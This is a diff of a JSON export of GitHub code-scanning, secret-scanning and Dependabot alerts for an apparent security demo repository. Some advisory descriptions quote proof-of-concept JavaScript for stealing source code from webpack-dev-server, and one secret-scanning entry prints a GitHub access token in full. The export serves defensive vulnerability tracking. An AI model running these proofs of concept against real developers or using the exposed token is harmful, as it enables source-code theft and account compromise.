@@ -28,7 +28,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -36,7 +36,7 @@
         "environment": "{\"build-mode\":\"none\",\"language\":\"java-kotlin\"}",
         "category": "/language:java-kotlin",
         "state": "open",
-        "commit_sha": "1e9064ac5276968d6d8585fc66134a58ed78e01e",
+        "commit_sha": "d139f37371e88e08e450895d4e223cfea55d0b51",
         "message": {
           "text": "Unsafe deserialization depends on a user-provided value.\nUnsafe deserialization depends on a user-provided value."
         },
@@ -80,7 +80,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -88,7 +88,7 @@
         "environment": "{\"build-mode\":\"none\",\"language\":\"java-kotlin\"}",
         "category": "/language:java-kotlin",
         "state": "open",
-        "commit_sha": "1e9064ac5276968d6d8585fc66134a58ed78e01e",
+        "commit_sha": "d139f37371e88e08e450895d4e223cfea55d0b51",
         "message": {
           "text": "CSRF vulnerability due to protection being disabled."
         },
@@ -134,7 +134,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -142,7 +142,7 @@
         "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
         "category": "/language:go",
         "state": "open",
-        "commit_sha": "1e9064ac5276968d6d8585fc66134a58ed78e01e",
+        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
         "message": {
           "text": "Sensitive data returned by HTTP request headers flows to a logging call."
         },
@@ -188,7 +188,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -196,7 +196,7 @@
         "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
         "category": "/language:go",
         "state": "open",
-        "commit_sha": "1e9064ac5276968d6d8585fc66134a58ed78e01e",
+        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
         "message": {
           "text": "Sensitive data returned by HTTP request headers flows to a logging call."
         },
@@ -240,7 +240,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -248,7 +248,7 @@
         "environment": "{\"build-mode\":\"autobuild\",\"language\":\"go\"}",
         "category": "/language:go",
         "state": "open",
-        "commit_sha": "1e9064ac5276968d6d8585fc66134a58ed78e01e",
+        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
         "message": {
           "text": "This query depends on a user-provided value.\nThis query depends on a user-provided value."
         },
@@ -293,7 +293,7 @@
       "tool": {
         "name": "CodeQL",
         "guid": null,
-        "version": "2.21.3"
+        "version": "2.21.4"
       },
       "most_recent_instance": {
         "ref": "refs/heads/main",
@@ -301,7 +301,7 @@
         "environment": "{}",
         "category": ".github/workflows/GHAS.yml:code-scanning",
         "state": "open",
-        "commit_sha": "dd31f3e609c5047e97ec74f245b453027c520a4b",
+        "commit_sha": "34d8df19db9342ad945874196af3076babdf93e6",
         "message": {
           "text": "Cross-site scripting vulnerability due to user-provided value."
         },
@@ -333,6 +333,18 @@
       "multi_repo": false,
       "is_base64_encoded": false,
       "secret": "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",
+      "first_location_detected": {
+        "path": "README.md",
+        "start_line": 7,
+        "end_line": 7,
+        "start_column": 1,
+        "end_column": 41,
+        "blob_sha": "835c21470938a0ffbca230d1f879dc8cb2cfb828",
+        "blob_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/git/blobs/835c21470938a0ffbca230d1f879dc8cb2cfb828",
+        "commit_sha": "ed0002b1040037c1a681f2ab9b8374dcf148c42c",
+        "commit_url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/git/commits/ed0002b1040037c1a681f2ab9b8374dcf148c42c"
+      },
+      "has_more_locations": true,
       "publicly_leaked": true,
       "resolution": null,
       "resolved_by": null,
@@ -368,6 +380,499 @@
     }
   ],
   "dependabot": [
+    {
+      "number": 172,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "requests"
+        },
+        "manifest_path": "authn-service/requirements.txt",
+        "scope": "runtime",
+        "relationship": "unknown"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-9hjg-9r4m-mvj7",
+        "cve_id": "CVE-2024-47081",
+        "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+        "description": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-9hjg-9r4m-mvj7",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2024-47081",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
+          },
+          {
+            "url": "https://github.com/psf/requests/pull/6965"
+          },
+          {
+            "url": "https://github.com/psf/requests/commit/96ba401c1296ab1dda74a2365ef36d88f7d144ef"
+          },
+          {
+            "url": "https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env"
+          },
+          {
+            "url": "https://seclists.org/fulldisclosure/2025/Jun/2"
+          },
+          {
+            "url": "http://seclists.org/fulldisclosure/2025/Jun/2"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/11"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/03/9"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/1"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/6"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-9hjg-9r4m-mvj7"
+          }
+        ],
+        "published_at": "2025-06-09T19:06:08Z",
+        "updated_at": "2025-06-09T19:06:12Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "requests"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 2.32.4",
+            "first_patched_version": {
+              "identifier": "2.32.4"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "score": 5.3
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00057,
+          "percentile": 0.17919
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 5.3
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-522",
+            "name": "Insufficiently Protected Credentials"
+          }
+        ]
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "requests"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": "< 2.32.4",
+        "first_patched_version": {
+          "identifier": "2.32.4"
+        }
+      },
+      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/172",
+      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/172",
+      "created_at": "2025-06-09T22:21:27Z",
+      "updated_at": "2025-06-09T22:21:27Z",
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 171,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "Django"
+        },
+        "manifest_path": "authn-service/requirements.txt",
+        "scope": "runtime",
+        "relationship": "unknown"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-7xr5-9hcq-chf9",
+        "cve_id": "CVE-2025-48432",
+        "summary": "Django Improper Output Neutralization for Logs vulnerability",
+        "description": "An issue was discovered in Django 5.2 before 5.2.2, 5.1 before 5.1.10, and 4.2 before 4.2.22. Internal HTTP response logging does not escape request.path, which allows remote attackers to potentially manipulate log output via crafted URLs. This may lead to log injection or forgery when logs are viewed in terminals or processed by external systems.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-7xr5-9hcq-chf9",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2025-48432",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48432"
+          },
+          {
+            "url": "https://docs.djangoproject.com/en/dev/releases/security"
+          },
+          {
+            "url": "https://groups.google.com/g/django-announce"
+          },
+          {
+            "url": "https://www.djangoproject.com/weblog/2025/jun/04/security-releases"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/04/5"
+          },
+          {
+            "url": "https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-47.yaml"
+          },
+          {
+            "url": "https://www.djangoproject.com/weblog/2025/jun/10/bugfix-releases"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/2"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/3"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/06/10/4"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-7xr5-9hcq-chf9"
+          }
+        ],
+        "published_at": "2025-06-05T03:30:58Z",
+        "updated_at": "2025-06-10T20:03:55Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "Django"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 5.2, < 5.2.2",
+            "first_patched_version": {
+              "identifier": "5.2.2"
+            }
+          },
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "Django"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 5.0a1, < 5.1.10",
+            "first_patched_version": {
+              "identifier": "5.1.10"
+            }
+          },
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "Django"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "< 4.2.22",
+            "first_patched_version": {
+              "identifier": "4.2.22"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
+            "score": 4.0
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00053,
+          "percentile": 0.16509
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N",
+          "score": 4.0
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-117",
+            "name": "Improper Output Neutralization for Logs"
+          }
+        ]
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "Django"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": "< 4.2.22",
+        "first_patched_version": {
+          "identifier": "4.2.22"
+        }
+      },
+      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/171",
+      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/171",
+      "created_at": "2025-06-06T17:34:58Z",
+      "updated_at": "2025-06-06T17:34:58Z",
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 170,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "npm",
+          "name": "webpack-dev-server"
+        },
+        "manifest_path": "frontend/package-lock.json",
+        "scope": "development",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-4v9v-hfq4-rm2v",
+        "cve_id": "CVE-2025-30359",
+        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
+        "description": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-4v9v-hfq4-rm2v",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2025-30359",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30359"
+          },
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
+          }
+        ],
+        "published_at": "2025-06-04T21:09:13Z",
+        "updated_at": "2025-06-04T21:09:13Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "npm",
+              "name": "webpack-dev-server"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 5.2.0",
+            "first_patched_version": {
+              "identifier": "5.2.1"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "score": 5.3
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00033,
+          "percentile": 0.08088
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 5.3
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-749",
+            "name": "Exposed Dangerous Method or Function"
+          }
+        ]
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "npm",
+          "name": "webpack-dev-server"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": "<= 5.2.0",
+        "first_patched_version": {
+          "identifier": "5.2.1"
+        }
+      },
+      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/170",
+      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/170",
+      "created_at": "2025-06-05T19:54:31Z",
+      "updated_at": "2025-06-05T19:54:31Z",
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 169,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "npm",
+          "name": "webpack-dev-server"
+        },
+        "manifest_path": "frontend/package-lock.json",
+        "scope": "development",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-9jgg-88mc-972h",
+        "cve_id": "CVE-2025-30360",
+        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
+        "description": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-9jgg-88mc-972h",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2025-30360",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30360"
+          },
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb"
+          },
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+          },
+          {
+            "url": "https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
+          }
+        ],
+        "published_at": "2025-06-04T21:09:38Z",
+        "updated_at": "2025-06-04T21:09:39Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "npm",
+              "name": "webpack-dev-server"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": "<= 5.2.0",
+            "first_patched_version": {
+              "identifier": "5.2.1"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+            "score": 6.5
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "epss": {
+          "percentage": 0.00017,
+          "percentile": 0.02456
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 6.5
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-346",
+            "name": "Origin Validation Error"
+          }
+        ]
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "npm",
+          "name": "webpack-dev-server"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": "<= 5.2.0",
+        "first_patched_version": {
+          "identifier": "5.2.1"
+        }
+      },
+      "url": "https://api.github.com/repos/Champmsecurity/ghas-demo-1/dependabot/alerts/169",
+      "html_url": "https://github.com/Champmsecurity/ghas-demo-1/security/dependabot/169",
+      "created_at": "2025-06-05T19:54:30Z",
+      "updated_at": "2025-06-05T19:54:30Z",
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    },
     {
       "number": 168,
       "state": "open",
@@ -440,8 +945,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00035,
-          "percentile": 0.08931
+          "percentage": 0.00039,
+          "percentile": 0.11207
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -696,8 +1201,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00019,
-          "percentile": 0.03458
+          "percentage": 0.00021,
+          "percentile": 0.03896
         },
         "cvss": {
           "vector_string": null,
@@ -1211,8 +1716,8 @@
       "security_advisory": {
         "ghsa_id": "GHSA-rhx6-c78j-4q9w",
         "cve_id": "CVE-2024-52798",
-        "summary": "Unpatched `path-to-regexp` ReDoS in 0.1.x",
-        "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in the 0.1.x release of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
+        "summary": "path-to-regexp contains a ReDoS",
+        "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
         "severity": "high",
         "identifiers": [
           {
@@ -1245,7 +1750,7 @@
           }
         ],
         "published_at": "2024-12-05T22:40:47Z",
-        "updated_at": "2025-01-24T21:41:09Z",
+        "updated_at": "2025-06-03T14:30:57Z",
         "withdrawn_at": null,
         "vulnerabilities": [
           {
@@ -1262,8 +1767,8 @@
         ],
         "cvss_severities": {
           "cvss_v3": {
-            "vector_string": null,
-            "score": 0.0
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "score": 7.5
           },
           "cvss_v4": {
             "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
@@ -1275,8 +1780,8 @@
           "percentile": 0.1197
         },
         "cvss": {
-          "vector_string": null,
-          "score": 0.0
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
         },
         "cwes": [
           {
@@ -1402,8 +1907,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00132,
-          "percentile": 0.34232
+          "percentage": 0.00151,
+          "percentile": 0.36889
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -1533,8 +2038,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00132,
-          "percentile": 0.34232
+          "percentage": 0.00151,
+          "percentile": 0.36889
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -1746,8 +2251,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00045,
-          "percentile": 0.13522
+          "percentage": 0.00042,
+          "percentile": 0.12261
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
@@ -2081,8 +2586,8 @@
           }
         },
         "epss": {
-          "percentage": 0.0004,
-          "percentile": 0.11481
+          "percentage": 0.00043,
+          "percentile": 0.1265
         },
         "cvss": {
           "vector_string": null,
@@ -2186,8 +2691,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00042,
-          "percentile": 0.12282
+          "percentage": 0.00046,
+          "percentile": 0.14064
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
@@ -2305,8 +2810,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00052,
-          "percentile": 0.16112
+          "percentage": 0.00044,
+          "percentile": 0.13096
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
@@ -2421,8 +2926,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00041,
-          "percentile": 0.11918
+          "percentage": 0.00045,
+          "percentile": 0.13642
         },
         "cvss": {
           "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
@@ -2526,8 +3031,8 @@
           }
         },
         "epss": {
-          "percentage": 0.00633,
-          "percentile": 0.69249
+          "percentage": 0.00532,
+          "percentile": 0.66224
         },
         "cvss": {
